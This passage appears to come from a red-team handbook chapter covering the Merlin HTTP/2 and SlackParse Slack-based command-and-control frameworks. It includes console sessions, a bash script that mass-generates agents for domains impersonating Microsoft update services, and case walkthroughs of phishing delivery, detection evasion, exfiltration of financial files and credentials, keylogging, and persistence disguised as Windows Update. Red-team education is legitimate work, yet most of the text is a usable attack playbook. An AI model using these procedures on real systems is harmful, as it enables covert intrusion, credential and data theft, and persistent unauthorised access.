   - Coordinated exfiltration timing to minimize detection
   - Used Armitage's built-in file browser to extract data from multiple systems simultaneously

This example demonstrates how Armitage's team collaboration features enhance red team effectiveness, allowing coordinated attacks across large networks while maintaining shared situational awareness.

## Merlin: HTTP/2 Command and Control

Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in Go. Its use of HTTP/2 provides advantages in terms of efficiency and potential evasion of network detection.

### Installation

```bash
# Clone the repository
git clone https://github.com/Ne0nd0g/merlin.git
cd merlin

# Build the server (requires Go)
make

# Alternatively, download pre-compiled binaries from the GitHub releases page
```

### Starting the Merlin Server

```bash
cd merlin/data/bin
./merlinServer-linux-x64

[+] Starting Merlin Server version: 1.2.3
[+] Server started at: 2023-03-15T14:30:40Z
[+] Running in C2 mode
[!] Certificate was not provided; using insecure TLS configuration
[+] HTTPS listener started on 127.0.0.1:443

Merlin»
```

### Generating Agents

To generate an agent for Windows:

```
Merlin» agents

[INFO]  Available agent types:
[*]     HTTPS
[*]     HTTP
[*]     H2C

Merlin» use HTTPS

Merlin[agent/HTTPS]» generate windows amd64 https://example.com:443

[+] windows/amd64 agent generated at: /root/merlin/data/bin/agent.exe
```

### Agent Interaction

Once an agent connects back to the server:

```
[+] Received new agent connection from 192.168.1.10:50567
[+] Agent 694dfd87-... connected at 2023-03-15T14:32:40Z

Merlin» agents

[+] Agent Information:
==========================================================
  ID     | Status | Last Check-In | IP / Port           | OS / Arch  
==========================================================
  694dfd | Active | 2023-03-15    | 192.168.1.10:50567  | windows/amd64

Merlin» interact 694dfd

Merlin[agent/694dfd]» info

ID: 694dfd87-...
Platform: windows
Architecture: amd64
Username: DESKTOP-ABCDEF\user
IP: 192.168.1.10/24
Process Name: merlin.exe
Process ID: 4231
HTTP Host: https://example.com:443
Initial Check-in: 2023-03-15T14:32:40Z
Last Check-in: 2023-03-15T14:32:40Z
```

### Executing Commands

```
Merlin[agent/694dfd]» shell whoami

[+] Command output:
desktop-abcdef\user

Merlin[agent/694dfd]» shell dir C:\Users

[+] Command output:
 Volume in drive C has no label.
 Volume Serial Number is ...
 
 Directory of C:\Users
 
 ...
```

### Running Modules

Merlin includes various modules for post-exploitation activities:

```
Merlin[agent/694dfd]» module list

[+] Available modules:
[*] windows/x64/ps
[*] windows/x64/minidump
[*] windows/x64/shellcode
...

Merlin[agent/694dfd]» module use windows/x64/ps

Merlin[module/windows/x64/ps]» run

[+] Process List:
===========================================================
  PID    | Name              | Owner                      
===========================================================
  4      | System            | NT AUTHORITY\SYSTEM       
  96     | Registry          | NT AUTHORITY\SYSTEM       
  544    | svchost.exe       | NT AUTHORITY\SYSTEM       
  ...
```

### Merlin Automation Script

This script automates setting up a Merlin server and generating agents for different platforms:

```bash
#!/bin/bash
# merlin_automation.sh - Automate Merlin C2 setup and agent generation

# Configuration
MERLIN_PATH="/opt/merlin"
OUTPUT_DIR="merlin_agents"
SERVER_IP="10.10.0.5"
SERVER_PORT="443"
DOMAINS=("updates.microsoft-defender.com" "cdn.windows-update.net")
PLATFORMS=("windows" "linux" "darwin")
ARCHS=("amd64" "386")

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Build Merlin if not already built
if [ ! -f "$MERLIN_PATH/data/bin/merlinServer-linux-x64" ]; then
    echo "Building Merlin from source..."
    cd "$MERLIN_PATH"
    make
fi

# Function to generate Merlin agents
generate_agents() {
    local SERVER_URL=$1
    local DOMAIN_DIR=$2
    
    # Create domain directory
    mkdir -p "$DOMAIN_DIR"
    
    # Generate agents for each platform/arch combination
    for PLATFORM in "${PLATFORMS[@]}"; do
        for ARCH in "${ARCHS[@]}"; do
            # Skip invalid combinations
            if [ "$PLATFORM" == "darwin" ] && [ "$ARCH" == "386" ]; then
                continue
            fi
            
            echo "Generating $PLATFORM/$ARCH agent for $SERVER_URL..."
            
            # Determine file extension
            EXT=""
            if [ "$PLATFORM" == "windows" ]; then
                EXT=".exe"
            fi
            
            # Create Merlin script
            cat > "/tmp/merlin_gen.cmd" << EOF
agents
use HTTPS
generate $PLATFORM $ARCH $SERVER_URL
exit
EOF
            
            # Run Merlin in headless mode
            cd "$MERLIN_PATH/data/bin"
            ./merlinServer-linux-x64 -i /tmp/merlin_gen.cmd > /tmp/merlin_output.log 2>&1
            
            # Move generated agent to output directory
            AGENT_FILE=$(grep "agent generated at" /tmp/merlin_output.log | awk '{print $NF}')
            if [ -f "$AGENT_FILE" ]; then
                OUTPUT_FILE="$DOMAIN_DIR/merlin_${PLATFORM}_${ARCH}${EXT}"
                cp "$AGENT_FILE" "$OUTPUT_FILE"
                echo "Agent saved to $OUTPUT_FILE"
            else
                echo "Failed to generate agent for $PLATFORM/$ARCH"
            fi
        done
    done
}

# Generate agents for each domain
for DOMAIN in "${DOMAINS[@]}"; do
    generate_agents "https://$DOMAIN:$SERVER_PORT" "$OUTPUT_DIR/$DOMAIN"
done

# Create server start script
cat > "$OUTPUT_DIR/start_merlin_server.sh" << EOF
#!/bin/bash
cd "$MERLIN_PATH/data/bin"
./merlinServer-linux-x64
EOF
chmod +x "$OUTPUT_DIR/start_merlin_server.sh"

# Create server configuration information
cat > "$OUTPUT_DIR/server_config.txt" << EOF
Merlin Server Configuration
==========================

Server IP: $SERVER_IP
Server Port: $SERVER_PORT
Domains: ${DOMAINS[*]}

To start the server, run:
$OUTPUT_DIR/start_merlin_server.sh

Remember to:
1. Configure DNS records for the domains to point to $SERVER_IP
2. Set up appropriate redirectors or proxies if needed
3. Configure TLS certificates for the domains
EOF

echo "Merlin setup complete. Configuration saved to $OUTPUT_DIR/server_config.txt"
```

### Example: HTTP/2 C2 for Evasion

During a red team assessment of a financial institution with sophisticated network monitoring, we used Merlin to demonstrate effective command and control through their defenses:

1. **Infrastructure Setup**:
   ```bash
   # Set up Merlin server behind a redirector
   # Used legitimate TLS certificates from Let's Encrypt
   # Configured domain to mimic Microsoft update services
   ```

2. **Initial Access**:
   - Delivered Merlin agent through a targeted phishing campaign
   - Agent executed and established HTTP/2 connection to C2 server

3. **Evading Network Detection**:
   ```
   # On the target network, Merlin's HTTP/2 traffic blended with legitimate HTTPS
   # Used sleep parameters to reduce traffic frequency
   
   Merlin[agent/b72aef]» set SleepTime 300s
   Merlin[agent/b72aef]» set MaxRetry 10
   ```

4. **Data Collection and Exfiltration**:
   ```
   Merlin[agent/b72aef]» shell dir "C:\Users\Administrator\Documents\Financial Reports" /s

   # Located sensitive financial data
   
   Merlin[agent/b72aef]» upload "C:\Users\Administrator\Documents\Financial Reports\Q3_Earnings.xlsx"
   ```

5. **Persistence Through HTTP/2**:
   ```
   # Established registry run key persistence
   Merlin[agent/b72aef]>> shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Administrator\AppData\Local\Temp\update.exe" /f
   
   # Created second agent with different sleep time
   # This provided redundant access with different communication patterns
   ```

This example demonstrates Merlin's effectiveness in environments with sophisticated network monitoring, where traditional C2 protocols might be detected and blocked. The use of HTTP/2 helped the C2 traffic blend with legitimate web traffic, while the configurable sleep and retry parameters allowed for operational security tailored to the environment.

## SlackParse: Chat-based Command and Control

SlackParse is a unique command and control (C2) framework that uses Slack as its communication channel. This allows red teams to control compromised systems using an allowed corporate communication platform, effectively hiding C2 traffic in plain sight.

### Installation

```bash
# Clone the repository
git clone https://github.com/Katamaran/SlackParse.git
cd SlackParse

# Install dependencies
pip3 install -r requirements.txt
```

### Configuration

Before using SlackParse, you need to set up a Slack workspace and create an API token:

1. Create a Slack workspace at slack.com
2. Create a Slack app at api.slack.com/apps
3. Enable the proper permissions (channels:history, channels:read, chat:write)
4. Install the app to your workspace
5. Obtain the OAuth token

Edit the config.py file with your Slack details:

```python
# config.py
SLACK_TOKEN = "xoxb-your-token-here"
CHANNEL_NAME = "c2-channel"
BOT_NAME = "SlackParseBot"
CHECK_FREQUENCY = 5  # seconds
```

### Starting the C2 Server

```bash
python3 slackparse.py
```

### Agent Setup

SlackParse's agent is a Python script that can be compiled for target platforms:

```bash
# For Windows targets, using PyInstaller
pip3 install pyinstaller
pyinstaller --onefile --noconsole agent.py

# The compiled agent will be in the dist/ directory
```

### Command Execution

Once an agent connects, you can execute commands through the Slack channel:

1. In your designated Slack channel, type commands prefixed with `!`
2. Examples:
   - `!shell whoami` - Run a shell command
   - `!download C:\Users\admin\Documents\secret.docx` - Download a file
   - `!upload /tmp/malware.exe C:\Windows\Temp\update.exe` - Upload a file
   - `!screenshot` - Capture the target's screen
   - `!keylog start` - Start a keylogger

### Benefits of Chat-based C2

1. **Allowed Traffic**: Most organizations permit Slack traffic
2. **Encryption**: Communications are encrypted by default
3. **Anonymity**: Connection to legitimate Slack servers, not directly to C2
4. **Persistence**: Works from anywhere target has internet

### Example: Leveraging Corporate Communication Tools

During a red team assessment for a technology company, we used SlackParse to demonstrate how attackers could leverage approved communication channels:

1. **Preparation**:
   ```bash
   # Created a Slack workspace mimicking legitimate company workspaces
   # Generated agent disguised as a corporate monitoring tool
   # Compiled agent for Windows target environment
   ```

2. **Initial Access**:
   - Delivered agent through a targeted phishing email
   - Disguised as a required security update from IT
   - Agent executed and connected to Slack channel

3. **Operational Security**:
   ```
   # Used private Slack channel for all C2 communications
   # Limited commands to off-hours to avoid detection
   # Used file transfer capabilities to avoid suspicious network connections
   ```

4. **Data Exfiltration via Slack**:
   ```
   # In Slack channel
   !shell dir "C:\Users\Developer\source\repos\ProjectX" /s
   
   # Located sensitive source code
   !download "C:\Users\Developer\source\repos\ProjectX\credentials.xml"
   
   # Files were automatically uploaded to Slack as attachments
   # Downloaded from Slack directly, leaving no obvious exfiltration signatures
   ```

5. **Persistence Through Legitimate Channels**:
   ```
   # Established persistence that leveraged approved applications
   !shell powershell -enc BASE64_ENCODED_PERSISTENCE_SCRIPT
   
   # Created scheduled task to periodically reconnect to Slack
   !shell schtasks /create /tn "WindowsUpdater" /tr "C:\Program Files\Updater.exe" /sc daily /st 09:00
   ```

This example demonstrates how attackers can leverage legitimate communication platforms for command and control, making detection and attribution significantly more difficult. For the defenders, it highlights the need for monitoring even approved applications for suspicious usage patterns.

## Conclusion

Beyond the well-known Metasploit Framework, the specialized exploitation tools covered in this chapter provide red teams with a diverse arsenal for targeting specific environments and evading common defenses. From router exploitation with Routersploit to post-exploitation frameworks like Empire, Koadic, and Merlin, these tools enable red teams to demonstrate the full impact of security vulnerabilities.

Modern red team operations require adaptability and stealth, which these tools provide through various techniques:

1. **Targeted Exploitation**: Routersploit focuses on network infrastructure, attacking devices often overlooked in security assessments.

2. **Evasion Techniques**: Empire, Koadic, and Merlin offer different approaches to bypass endpoint protection, from PowerShell without PowerShell to COM objects and HTTP/2.

3. **Team Collaboration**: Armitage enhances Metasploit with visualization and team features, enabling coordinated attacks across complex environments.

4. **Living Off the Land**: Many of these frameworks leverage legitimate Windows components, making detection more difficult and demonstrating how attackers can operate with minimal custom tools.

5. **Alternative C2 Channels**: Tools like SlackParse showcase how attackers can leverage allowed corporate communication platforms for command and control.

By mastering these exploitation frameworks, red team operators can more effectively simulate sophisticated threat actors, providing organizations with a realistic assessment of their security posture against current attack techniques.

In the next chapter, we'll explore web application exploitation tools that focus specifically on identifying and exploiting vulnerabilities in web applications, a common entry point for attackers targeting modern organizations.
